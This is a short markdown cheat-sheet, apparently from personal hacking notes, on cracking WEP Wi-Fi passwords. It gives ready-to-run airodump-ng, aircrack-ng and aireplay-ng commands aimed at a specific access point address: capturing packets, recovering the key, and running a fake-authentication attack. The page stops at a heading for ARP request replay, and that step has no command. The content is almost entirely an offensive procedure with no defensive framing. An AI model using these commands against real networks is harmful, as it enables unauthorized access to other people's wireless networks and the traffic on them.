---
description: breaking wep, wpa, wpa2 ectc.
---

# Wifi Cracking

### wep hacking

> Note: this methods works on a busy network where the  "#Data" column value increases at a very fast rate.

1. we have to capture a large number of packets for this to work, using the airodump-ng utility.

```bash
airodump-ng --bssid 98:A9:42:27:A2:CA --channel 2 --write wep_capture wlan0mon
```

2. we then use the aircrack-ng utility to crack the password using the captured .cap file.

```bash
aircrack wep_capture.cap
```

3. key found in the `KEY FOUND! [22:22:22:22:22]` remove the columns, then use the password to connect to the wep network.

> In a network thats not busy: you can force the AP to generate new packets new IVs.





**Solution:** Associate with the AP before launching the attack.

1. run a scan with airodump-ng utility.

```
airodump-ng --bssid 98:A9:42:27:A2:CA --channel 2 --write arp_replay wlan0mon
```

2. run the aireplay-ng utility to establish "an Association" with the target network. `--fakeauth 0` denotes running a fake authentication attack once, `-c` mac addr of the target AP, `-h` mac addr of our wlan0mon adapter and the name of the adapter.

```
aireplay-ng --fakeauth 0 -a 98:A9:42:27:A2:CA -h 11:22:33:44:55:66 wlan0mon
```

3. forcing the AP to generate new IVs (ARP Request Replay).

